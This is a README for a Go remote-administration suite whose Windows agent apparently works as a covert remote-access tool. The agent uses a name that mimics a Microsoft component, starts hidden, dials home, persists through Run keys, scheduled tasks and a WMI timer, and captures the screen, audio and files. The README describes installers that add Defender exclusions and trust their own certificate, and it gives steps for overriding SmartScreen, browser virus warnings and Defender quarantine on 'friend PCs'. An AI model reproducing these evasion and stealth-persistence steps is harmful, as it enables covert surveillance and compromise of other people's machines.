# RMM — Remote Monitor & Management

Go-based remote administration suite: a stealth agent for Windows PCs plus a
controller with a native WebView2 UI (screen, files, terminal, processes,
audio). Direct TLS with MQTT/ntfy relay fallback, so agents stay reachable
without port forwarding.

**Releases (all 6 desktop assets):**
https://github.com/gibishahar-sudo/Controller-/releases

## Components

| Binary | What it is |
|---|---|
| `Agent-Setup.exe` | Silent agent installer (Admin) |
| `MicrosoftWindowsClient.exe` | The agent itself (also its own `--watch` supervisor) |
| `controller-native.exe` | Controller GUI, no browser needed |
| `Controller-Setup.exe` | Controller installer |
| `controller.exe` | Headless controller |
| `relay.exe` | Relay helper |

Phone controller/agent live alongside at `1.0.0`.

## Quick start

**Controller PC:** run `Controller-Setup.exe`, launch via the desktop shortcut.

**Remote PC:** copy `Agent-Setup.exe` over, run as Admin (optionally
`-controller HOST:4444 -token <agent-token>`). The agent starts hidden and
dials home; it appears in the controller's Connections list.

### If Windows blocks the download (friend PCs)

Since v1.40.15 every binary is Authenticode-signed by our `CN=RMM` cert, and
both setups automatically:

1. trust the publisher cert (TrustedPublisher store — no more "unknown
   publisher" SmartScreen block), and
2. add Defender path/process exclusions for the install dir.

If Windows still stops it, in order:

- **SmartScreen "Unknown publisher"** on old builds: click *More info →
  Run anyway*. v1.40.15+ signed builds don't show this after install.
- **"Virus detected / download blocked"** in the browser: … → *Keep* (it's
  the heuristic on admin tools, same class as PsExec).
- **Defender quarantine**: *Windows Security → Protection history* → allow
  the file, then re-run the setup (it adds exclusions going forward).

## Highlights (v1.40.13)

- **Self-healing agent** — dual hidden backups, native `--watch` supervisor
  (no PowerShell), crash-loop rollback to the previous build with controller
  alarm + automatic holdback of the bad version. Layered persistence (two
  Run values, three scheduled tasks, WMI timer) survives task/registry wipes.
- **Safe updates** — gzipped, resumable, retried chunk pushes with live
  progress; per-agent or Update All; optional auto-update on check-in.
- **Chunked file transfer** — multi-select batch queues, folder zip up/down,
  image/text previews, SHA-256 verified both ways.
- **Fleet security** — per-install registration tokens, rogue rejection,
  enforcement mode, untrusted badges.
- **Transports** — direct TLS first (parallel dial race + last-good cache),
  then MQTT (4-lane parallel), then ntfy. Tile-diff screen sharing, native
  Win32 input, end-to-end encrypted relay payloads.

## Updating the fleet

Controller → **Update All** (or enable auto-update in Settings). Agents
verify hash, stash the running build as rollback, and restart themselves.

## Versioning

Single source of truth: `internal/version/version.go`. Every release bumps
the version and ships all 6 assets together under one `vX.Y.Z` tag.

## Building

```sh
go vet ./...
go run ./tool/jscheck        # must print BALANCED OK + DOM-ORDER OK
go test ./...
# Release binaries always strip debug info (smaller + quieter footprint):
go build -ldflags="-s -w" -o MicrosoftWindowsClient.exe ./cmd/agent
# ... same -ldflags for all 6 assets
```

## Layout

- `cmd/agent` — agent + `--watch` supervisor
- `cmd/controller*` — headless / browser / native WebView2 frontends (one shared `internal/controller`)
- `cmd/installer-agent`, `cmd/installer-dev` — the two setups
- `internal/commands` — agent command handlers (files, input, audio, updates)
- `internal/controller` — server, HTTP API, MQTT/ntfy relay buses
- `internal/ui/frontend` — controller web UI (embedded)
- `tool/jscheck` — release gate for the served page
